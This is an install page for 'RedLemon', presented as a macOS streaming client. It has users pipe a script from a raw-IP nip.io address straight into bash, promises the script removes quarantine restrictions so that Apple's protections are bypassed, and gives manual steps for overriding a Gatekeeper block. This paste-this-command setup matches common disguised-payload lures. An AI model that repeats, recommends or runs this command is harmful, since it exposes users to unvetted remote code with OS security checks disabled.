# 🍋 Install RedLemon

RedLemon is a powerful, native streaming client for macOS. 
To bypass Apple's restrictions and install seamlessly, use the terminal command below.

## 🚀 The Magic Install (Recommended)

Copy and paste this into your Terminal to install instantly. No warnings, no hassle.

```bash
curl -sL https://151.243.109.243.nip.io/updates/install | bash
```

**What this does:**
1.  Downloads the latest version.
2.  Installs to `/Applications`.
3.  **Removes quarantine restrictions** automatically.
4.  Launches the app.

---

## 🐢 Manual Install (The Slow Way)

If you prefer the traditional route, be prepared for Apple's security prompts.

1.  **[Download DMG](https://151.243.109.243.nip.io/updates/RedLemon-latest.dmg)**
2.  Open the file and drag `RedLemon` to your Applications folder.
3.  Double-click to open. **It will be blocked.**
4.  Go to **System Settings** → **Privacy & Security**.
5.  Scroll down and click **"Open Anyway"**.
6.  Confirm the dialog.

_Requires macOS 12 (Monterey) or later._
